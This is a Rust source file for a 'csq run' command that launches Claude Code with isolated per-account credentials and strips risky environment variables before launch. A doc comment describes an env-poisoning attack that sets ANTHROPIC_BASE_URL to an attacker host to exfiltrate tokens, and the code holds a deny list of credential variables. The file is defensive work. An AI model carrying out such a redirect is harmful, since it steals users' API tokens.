//! `csq run [N]` — launch Claude Code with isolated credentials.

use anyhow::{anyhow, Context, Result};
use csq_core::accounts::{discovery, markers};
use csq_core::broker::fanout::is_broker_failed;
use csq_core::credentials::{self, file};
use csq_core::session;
use csq_core::types::AccountNum;
use std::path::Path;
use std::process::Command;

pub fn handle(
    base_dir: &Path,
    account: Option<AccountNum>,
    profile: Option<&str>,
    rest: &[String],
) -> Result<()> {
    let claude_home = super::claude_home()?;

    // Resolve account number
    let account = resolve_account(base_dir, account)?;

    let account = match account {
        Some(a) => a,
        None => {
            // 0 accounts — launch vanilla claude
            println!("No accounts configured — launching vanilla claude.");
            return exec_claude(rest);
        }
    };

    // Set up config dir
    let config_dir = base_dir.join(format!("config-{}", account));
    std::fs::create_dir_all(&config_dir)?;

    // Isolate: symlink shared items
    session::isolate_config_dir(&claude_home, &config_dir)
        .context("failed to isolate config dir")?;

    // Mark account
    markers::write_csq_account(&config_dir, account)?;
    markers::write_current_account(&config_dir, account)?;

    // Cleanup stale PID
    session::setup::cleanup_stale_pid(&config_dir);

    // Mark onboarding complete
    session::mark_onboarding_complete(&config_dir)?;

    // Check broker-failed flag before launching.
    // Real token refresh happens via the daemon (M8); for now we honor
    // the flag but don't try to refresh ourselves.
    if is_broker_failed(base_dir, account) {
        return Err(anyhow!(
            "account {} is in LOGIN-NEEDED state — run `csq login {}` to re-authenticate",
            account,
            account
        ));
    }

    // Verify canonical credentials exist and are loadable before copying
    let canonical_path = file::canonical_path(base_dir, account);
    let canonical = credentials::load(&canonical_path)
        .with_context(|| format!("failed to load canonical credentials for account {account}"))?;

    // Warn if token is already expired (refresh will happen via daemon when available)
    if canonical.claude_ai_oauth.is_expired_within(0) {
        eprintln!(
            "warning: access token for account {} has expired — CC may fail until the daemon refreshes it",
            account
        );
    }

    // Copy credentials for the session
    session::setup::copy_credentials_for_session(base_dir, &config_dir, account)
        .context("failed to copy credentials")?;

    // Merge profile settings if specified.
    // Profile overlay requires wiring session::merge::merge_settings onto
    // config_dir/settings.json — deferred to the follow-up PR that adds
    // profile CLI plumbing.
    if let Some(profile_id) = profile {
        return Err(anyhow!(
            "--profile support is not yet implemented (requested: {profile_id})"
        ));
    }

    println!("Launching claude for account {}...", account);

    // Strip ANTHROPIC_* (and related) env vars before exec.
    // Prevents env-poisoning attacks where ANTHROPIC_BASE_URL could
    // redirect traffic to an attacker server.
    let mut cmd = Command::new("claude");
    cmd.env("CLAUDE_CONFIG_DIR", &config_dir);
    strip_sensitive_env(&mut cmd);
    cmd.args(rest);

    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        let err = cmd.exec();
        Err(anyhow!("exec failed: {err}"))
    }

    #[cfg(not(unix))]
    {
        let status = cmd.status()?;
        if !status.success() {
            std::process::exit(status.code().unwrap_or(1));
        }
        Ok(())
    }
}

fn resolve_account(base_dir: &Path, explicit: Option<AccountNum>) -> Result<Option<AccountNum>> {
    if let Some(a) = explicit {
        return Ok(Some(a));
    }

    let accounts = discovery::discover_anthropic(base_dir);
    let anthropic_with_creds: Vec<_> = accounts.iter().filter(|a| a.has_credentials).collect();

    match anthropic_with_creds.len() {
        0 => Ok(None), // vanilla claude
        1 => {
            let num = AccountNum::try_from(anthropic_with_creds[0].id)
                .map_err(|e| anyhow!("invalid account: {e}"))?;
            Ok(Some(num))
        }
        _ => {
            let mut msg = String::from("multiple accounts configured — specify one:\n");
            for a in &anthropic_with_creds {
                msg.push_str(&format!("  csq run {}  ({})\n", a.id, a.label));
            }
            Err(anyhow!(msg))
        }
    }
}

fn exec_claude(rest: &[String]) -> Result<()> {
    let mut cmd = Command::new("claude");
    // Always strip sensitive env vars, even on the vanilla path.
    strip_sensitive_env(&mut cmd);
    cmd.args(rest);

    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        let err = cmd.exec();
        Err(anyhow!("exec failed: {err}"))
    }

    #[cfg(not(unix))]
    {
        let status = cmd.status()?;
        std::process::exit(status.code().unwrap_or(1));
    }
}

/// Removes env vars that could override credentials, redirect API traffic,
/// or otherwise compromise the isolated session.
///
/// Strips every `ANTHROPIC_*` variable plus bedrock/vertex variants.
/// This prevents attacks where a poisoned dotfile sets
/// `ANTHROPIC_BASE_URL=https://attacker.example.com` and silently
/// exfiltrates tokens on every CC API call.
fn strip_sensitive_env(cmd: &mut Command) {
    // Collect into a Vec first so we don't mutate env vars during iteration.
    let to_strip: Vec<String> = std::env::vars()
        .filter_map(|(k, _)| {
            if k.starts_with("ANTHROPIC_")
                || k == "AWS_BEARER_TOKEN_BEDROCK"
                || k == "CLAUDE_API_KEY"
            {
                Some(k)
            } else {
                None
            }
        })
        .collect();

    for key in to_strip {
        cmd.env_remove(&key);
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn strip_sensitive_env_removes_anthropic_vars() {
        // We can't modify the real env during tests (parallel safety), so
        // we test the logic by verifying the filter directly.
        let test_vars = [
            ("ANTHROPIC_API_KEY", true),
            ("ANTHROPIC_BASE_URL", true),
            ("ANTHROPIC_AUTH_TOKEN", true),
            ("ANTHROPIC_MODEL", true),
            ("AWS_BEARER_TOKEN_BEDROCK", true),
            ("CLAUDE_API_KEY", true),
            ("PATH", false),
            ("HOME", false),
            ("CLAUDE_CONFIG_DIR", false),
            ("CLAUDE_HOME", false),
        ];

        for (var, should_strip) in test_vars {
            let matches = var.starts_with("ANTHROPIC_")
                || var == "AWS_BEARER_TOKEN_BEDROCK"
                || var == "CLAUDE_API_KEY";
            assert_eq!(matches, should_strip, "var {var}");
        }
    }
}
